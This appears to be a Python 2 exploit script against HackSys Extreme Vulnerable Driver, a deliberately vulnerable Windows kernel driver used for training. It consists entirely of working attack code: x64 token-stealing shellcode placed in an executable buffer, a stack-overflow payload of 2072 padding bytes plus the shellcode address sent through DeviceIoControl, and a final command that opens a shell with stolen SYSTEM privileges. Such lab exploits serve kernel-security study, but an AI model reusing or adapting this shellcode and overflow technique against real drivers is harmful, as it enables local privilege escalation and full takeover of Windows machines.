import struct, sys, os
from ctypes import *
from subprocess import *

kernel32 = windll.kernel32
handle = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)

if not handle or handle == -1:
    print "[+] Cannot get device handle."
    sys.exit(0)
	
	
print "[+] Successful opening device handle"

shellcode = "\x50\x51\x52\x48\x31\xC0\x65\x48\x8B\x80\x88\x01\x00\x00\x48\x8B\x40\x70\x48\x89\xC1\x48\xC7\xC2\x04\x00\x00\x00\x48\x8B\x80\x88\x01\x00\x00\x48\x2D\x88\x01\x00\x00\x48\x39\x90\x80\x01\x00\x00\x75\xEA\x48\x8B\x90\x08\x02\x00\x00\x48\x89\x91\x08\x02\x00\x00\x5A\x59\x58"

cleanup = "\x48\x83\xc4\x28\xc3"  

shellcode = shellcode + cleanup

addr = kernel32.VirtualAlloc(
    c_int64(0),
    c_int(len(shellcode)),
    c_int(0x3000),
    c_int(0x40)
)

if not addr:
    print("[-] Failed to create virtualalloc")
    exit(-1)

print("[+] Successfully allocated RWX buffer")

memmove(addr, shellcode, len(shellcode))

addr_bytes = struct.pack("<Q", addr)


print("[*] Virtual address is in {}".format(hex(addr)))
print(str(addr_bytes))

padding = "\x41" * 2072
padding += addr_bytes
#padding += "\x43" * (3000 - len(padding))

kernel32.DeviceIoControl(handle, 0x222003, padding, len(padding), None, 0, byref(c_ulong()), None)
print("======================")
os.system("cmd")
